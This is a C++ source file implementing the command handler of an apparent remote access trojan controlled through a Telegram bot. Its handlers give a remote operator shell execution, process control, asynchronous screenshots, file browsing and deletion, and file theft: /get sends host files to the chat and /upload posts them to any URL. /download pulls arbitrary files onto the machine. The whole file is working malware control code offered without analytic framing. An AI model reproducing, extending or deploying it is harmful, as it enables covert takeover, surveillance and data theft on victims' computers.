#include "rat/system.hpp"
#include "rat/tbot/handler/handleUpdate.hpp"
#include <algorithm>

#include <cstdint>
#include <filesystem>
#include <optional>
#include "logging.hpp"
#include "rat/networking.hpp"
#include "rat/RatState.hpp"

namespace rat::tbot::handler {


static uint16_t __stringToUint16(const std::string& str);
static std::string _handlePwdCommand(void);
static std::string _handleCdCommand(const Command& arg_Command);
static std::string _handleLsCommand(const Command& arg_Command);
static std::string _handleReadCommand(const Command& arg_Command);
static std::string _handleTouchCommand(const Command& arg_Command);
static std::string _handleGetCommand(Bot& arg_Bot, const Command& arg_Command);
static std::string _handleStatCommand(const Command& arg_Command);
static std::string _handleRmCommand(const Command& arg_Command);
static std::string _handleMvCommand(const Command& arg_Command);
static std::string _handleCpCommand(const Command& arg_Command);
static std::string _handleSetCommand(Bot& arg_Bot, const Command& arg_Command);

static std::string _handleListAvailableCommand(Bot& arg_Bot, rat::RatState& Session_State);

static std::string _handleMessageWithUploadedFiles(Bot& arg_Bot, const Message& Telegram_Message);

static std::string _handleDownloadCommand(rat::networking::Client& Curl_Client, const Command& arg_Command);
static std::string _handleUploadCommand(rat::networking::Client& Curl_Client ,const Command& arg_Command);


// ---------- Main Command Dispatcher ----------
static std::string _handleCommand(rat::RatState& Session_State, Bot& arg_Bot, Message& Telegram_Message) {
    if (Telegram_Message.text.empty() || Telegram_Message.text[0] != '/') {
        return "Not a command";
    }

    const char* text = Telegram_Message.text.c_str();

    // Launch separate processes on detached threads
    if (strncmp(text, "/sh", 3) == 0) {
        return _parseAndHandleShellCommand(Telegram_Message);
    }
    if(strncmp(text, "/list", 4) == 0) {
        return _handleListAvailableCommand(arg_Bot, Session_State);
    }

    if (strncmp(text, "/process", 8) == 0) {
        return _parseAndHandleProcessCommand(arg_Bot, Telegram_Message);
    }
    if (strncmp(text, "/screenshot", 11) == 0) {
        std::thread([bot_copy = arg_Bot]() mutable {
            std::string result = _handleScreenshotCommand(bot_copy);
            bot_copy.sendMessage(result);
            DEBUG_LOG("/screenshot command completed");
        }).detach();
        return "Taking screenshot asynchronously...";
    }

    Command arg_Command = _parseTelegramMessageToCommand(Telegram_Message);

    // Asynchronous file commands using TinyProcess
    if (arg_Command.directive == "/download") {
        std::thread([bot_copy = arg_Bot, cmd = arg_Command]() mutable {
            std::string result = _handleDownloadCommand(bot_copy.curl_client, cmd);
            bot_copy.sendMessage(result);
            DEBUG_LOG("/download command completed");
        }).detach();
        return "Downloading file asynchronously...";
    }

    if (arg_Command.directive == "/upload") {
        std::thread([bot_copy = arg_Bot, cmd = arg_Command]() mutable {
            std::string result = _handleUploadCommand(bot_copy.curl_client, cmd);
            bot_copy.sendMessage(result);
            DEBUG_LOG("/upload command completed");
        }).detach();
        return "Uploading file asynchronously...";
    }

    // Synchronous commands
    if (arg_Command.directive == "/set") return  _handleSetCommand(arg_Bot, arg_Command);
    if (arg_Command.directive == "/pwd") return  _handlePwdCommand();
    if (arg_Command.directive == "/cd") return   _handleCdCommand(arg_Command);
    if (arg_Command.directive == "/ls") return   _handleLsCommand(arg_Command);
    if (arg_Command.directive == "/read") return _handleReadCommand(arg_Command);
    if (arg_Command.directive == "/touch") return _handleTouchCommand(arg_Command);
    if (arg_Command.directive == "/get") return  _handleGetCommand(arg_Bot, arg_Command);
    if (arg_Command.directive == "/stat") return _handleStatCommand(arg_Command);
    if (arg_Command.directive == "/rm") return   _handleRmCommand(arg_Command);
    if (arg_Command.directive == "/mv") return   _handleMvCommand(arg_Command);
    if (arg_Command.directive == "/cp") return   _handleCpCommand(arg_Command);

    return fmt::format("Unknown command: {}", arg_Command.directive);
}


/*ALL of this module does is expose this one function handleUpdate()*/
// ---------- Entry Point ----------
void handleUpdate(rat::RatState& arg_State, Bot& arg_Bot, const Update& arg_Update) {
    Message telegram_message = std::move(arg_Update.message);
    if (telegram_message.id == 0) return;

    std::string response;

    response = _handleMessageWithUploadedFiles(arg_Bot, telegram_message);
    if (!response.empty()) {
        arg_Bot.sendMessage(response);
        return;
    }

    response = _handleCommand(arg_State, arg_Bot, telegram_message);
    if (!response.empty()) {
        arg_Bot.sendMessage(response);
        return;
    }

    DEBUG_LOG("No handler produced a response for message_id {}", telegram_message.id);
}
static std::string _handleListAvailableCommand(Bot& arg_Bot, rat::RatState& Session_State) {
    std::filesystem::path file_path(rat::system::getCurrentDateTime_Underscored());
    std::vector<std::string> tools = Session_State.listDynamicTools();
    std::sort(tools.begin(), tools.end());
    bool result = rat::system::echo(tools, file_path);
    if(result) {
        arg_Bot.sendFile(file_path);
        std::filesystem::remove(file_path);
    }else{
        arg_Bot.sendMessage("Failed at constructing the file and sending it");
    }
    return "finished";
    
}
// ---------- Helper ----------
static uint16_t __stringToUint16(const std::string& str) {
    try {
        unsigned long value = std::stoul(str);
        if (value > static_cast<unsigned long>(std::numeric_limits<uint16_t>::max())) {
            throw std::out_of_range("Value too large for uint16_t");
        }
        return static_cast<uint16_t>(value);
    }
    catch (const std::invalid_argument&) {
        throw std::invalid_argument("Invalid input: not a number");
    }
    catch (const std::out_of_range&) {
        throw std::out_of_range("Invalid input: out of range");
    }
}



// ---------- Command Handlers ----------
static std::string _handlePwdCommand(void) {
    return rat::system::pwd();
}

static std::string _handleCdCommand(const Command& arg_Command) {
    if (arg_Command.parameters.empty()) return "No path specified";
    const std::string& param = arg_Command.parameters[0];
    return rat::system::cd(rat::system::normalizePath(param));
}

static  std::string _handleLsCommand(const Command& arg_Command) {
    std::string path = "";
    if (!arg_Command.parameters.empty()) {
        path = arg_Command.parameters[0];
    }
    return rat::system::ls(rat::system::normalizePath(path));
}

static std::string _handleReadCommand(const Command& arg_Command) {
    if (arg_Command.parameters.empty()) return "No file specified";
    const std::string param = arg_Command.parameters[0];
    return rat::system::readFile(rat::system::normalizePath(param));
}

static std::string _handleTouchCommand(const Command& arg_Command) {
    if (arg_Command.parameters.empty()) return "No file specified";
    std::string response;
    bool success = false;
    for (size_t i = 0; i < arg_Command.parameters.size(); ++i) {
        success = rat::system::createFile(std::filesystem::path(arg_Command.parameters[i]));
        response += fmt::format("file: {} was {}\n",
            arg_Command.parameters[i],
            success ? "created" : "not created");
    }
    return response;
}
static  std::string _handleGetCommand(Bot& arg_Bot, const Command& arg_Command) {
    if (arg_Command.parameters.empty()) return "No file specified";
    auto file_path = std::filesystem::path(arg_Command.parameters[0]);
    if (std::filesystem::exists(file_path)) {
        arg_Bot.sendFile(file_path);
        return "File Uploaded to chat";
    }
    return "File Does not exist";
}

static std::string _handleStatCommand(const Command& arg_Command) {
    if (arg_Command.parameters.empty()) return "No file specified";
    std::filesystem::path p(arg_Command.parameters[0]);
    if (!std::filesystem::exists(p)) {
        return fmt::format("File does not exist: {}", arg_Command.parameters[0]);
    }

    return fmt::format(
        "File: {}\nSize: {} bytes\nLast modified: {}",
        p.string(),
        std::filesystem::file_size(p),
        std::filesystem::last_write_time(p).time_since_epoch().count()
    );
}

static std::string _handleDownloadCommand(rat::networking::Client& Curl_Client, const Command& arg_Command) {
    if (arg_Command.parameters.empty()) return "Usage: /download <url> [path]";
    std::string url = arg_Command.parameters[0];
    std::filesystem::path file_path;

    if (arg_Command.parameters.size() == 1) {
        file_path = rat::networking::_getFilePathFromUrl(url);
    } else {
        file_path = arg_Command.parameters[1];
        if (std::filesystem::is_directory(file_path)) {
            file_path /= rat::networking::_getFilePathFromUrl(url);
        }
    }

    auto result = Curl_Client.download(url, file_path);
    if(result) {
        return fmt::format("File: {} downloaded", file_path.string() );
    }else{
        return "File failed to download";
    }
}


static std::string _handleUploadCommand(rat::networking::Client& Curl_Client, const Command& arg_Command) {
    if (arg_Command.parameters.size() < 2) return "Usage: /upload <filepath> <url>";
    std::filesystem::path file_path = arg_Command.parameters[0];
    if (!std::filesystem::exists(file_path)) return "File not found";
    std::string url = arg_Command.parameters[1];

    bool result = Curl_Client.upload(file_path, url);
    if(result) {
        return fmt::format("Uploaded '{}' ", file_path.string());
    }else{
        return "Upload failed";
    }
}

static std::string _handleRmCommand(const Command& arg_Command) {
    if (arg_Command.parameters.empty()) return "No file specified";
    std::string response;
    bool success = false;
    for (size_t i = 0; i < arg_Command.parameters.size(); ++i) {
        const auto path = std::filesystem::path(arg_Command.parameters[i]);
        if (!std::filesystem::exists(path)) {
            response += fmt::format("file: {} does not exist, cannot be removed\n", path.string());
            continue;
        }

        success = rat::system::removeFile(path);
        response += fmt::format("file: {} was {}\n",
            arg_Command.parameters[i],
            success ? "removed" : "not removed");
    }
    return response;
}

static std::string _handleMvCommand(const Command& arg_Command) {
    if (arg_Command.parameters.size() < 2) return "Usage: /mv <src> <dest>";
    const auto source_path = std::filesystem::path(arg_Command.parameters[0]);
    const auto dist_path = std::filesystem::path(arg_Command.parameters[1]);

    if (!std::filesystem::exists(source_path)) {
        return fmt::format("Source path {} does not exist", source_path.string());
    }

    if (rat::system::isFile(source_path)) {
        if (rat::system::isDir(dist_path)) {
            if (rat::system::renameFile(source_path, dist_path / source_path.filename())) {
                return fmt::format("File {} has been successfully moved to {}",
                    source_path.string(), (dist_path / source_path.filename()).string());
            }
            return fmt::format("Failed to move file {} to {}",
                source_path.string(), dist_path.string());
        }

        if (rat::system::renameFile(source_path, dist_path)) {
            return fmt::format("File {} has been successfully renamed to {}",
                source_path.string(), dist_path.string());
        }
        return fmt::format("Failed to rename file {} to {}",
            source_path.string(), dist_path.string());
    }

    if (rat::system::moveDir(source_path, dist_path)) {
        return fmt::format("Directory {} has been successfully moved to {}",
            source_path.string(), dist_path.string());
    }
    return fmt::format("Failed to move directory {} to {}",
        source_path.string(), dist_path.string());
}

static std::string _handleCpCommand(const Command& arg_Command) {
    if (arg_Command.parameters.size() < 2) return "Usage: /cp <src> <dest>";
    const auto source_path = std::filesystem::path(arg_Command.parameters[0]);
    if (!std::filesystem::exists(source_path)) {
        return fmt::format("Path: {} does not exist", source_path.string());
    }

    const auto dist_path = std::filesystem::path(arg_Command.parameters[1]);
    if (std::filesystem::exists(dist_path)) {
        return fmt::format("Path {} already exists, overwrite disabled", dist_path.string());
    }

    const bool source_path_is_file = rat::system::isFile(source_path);
    const bool dist_path_is_file = rat::system::isFile(dist_path);
    bool result = false;

    if (source_path_is_file && dist_path_is_file) {
        result = rat::system::copyFile(source_path, dist_path);
    } else if (source_path_is_file && !dist_path_is_file) {
        result = rat::system::copyFile(source_path, dist_path / source_path.filename());
    } else if (!source_path_is_file && !dist_path_is_file) {
        result = rat::system::copyDir(source_path, dist_path);
    }

    if (result) {
        return fmt::format("Content of {} copied to {}", source_path.string(), dist_path.string());
    }
    return fmt::format("Failed to copy {} to {}", source_path.string(), dist_path.string());
}

static std::string _handleSetCommand(Bot& arg_Bot, const Command& arg_Command) {
    if (arg_Command.parameters.empty()) {
        return "/set <variable> <value>";
    }

    const std::string& variable = arg_Command.parameters[0];
    if (variable == "update_interval") {
        if (arg_Command.parameters.size() < 2) {
            return "Missing value for update_interval";
        }

        try {
            uint16_t update_interval = __stringToUint16(arg_Command.parameters[1]);
            arg_Bot.setUpdateIterval(update_interval);
            return fmt::format("Bot's update_interval == {}", update_interval);
        }
        catch (const std::exception& e) {
            return fmt::format("Error setting update_interval: {}", e.what());
        }
    }

    return fmt::format("Unknown variable: {}", variable);
}

static std::string _handleMessageWithUploadedFiles(Bot& arg_Bot, const Message& Telegram_Message) {
    if (Telegram_Message.files.empty())  return "";

    const std::vector<rat::tbot::File>& files = Telegram_Message.files;
    std::ostringstream response_buffer; // for collecting per-file messages

    for (const auto& file : files) {
        std::filesystem::path file_path = std::filesystem::current_path();

        // Determine the file name
        if (file.name.has_value() && !file.name->empty()) {
            file_path /= file.name.value();
        } else {
            file_path /= std::filesystem::path(rat::system::getCurrentDateTime_Underscored());
        }

        // Download the file
        if(arg_Bot.downloadFile(file.id, file_path)) {
        // Log the downloaded file
            response_buffer << "File: " << file_path.string() << " has been downloaded\n";
        }else {
            response_buffer << "File: " << file_path.string() << " has not been downloaded\n";
        }
                // Optionally, include per-file messages plus total count
        response_buffer << fmt::format("Received {} uploaded file(s)", files.size());
    }


    return response_buffer.str();
}



} // namespace rat::tbot
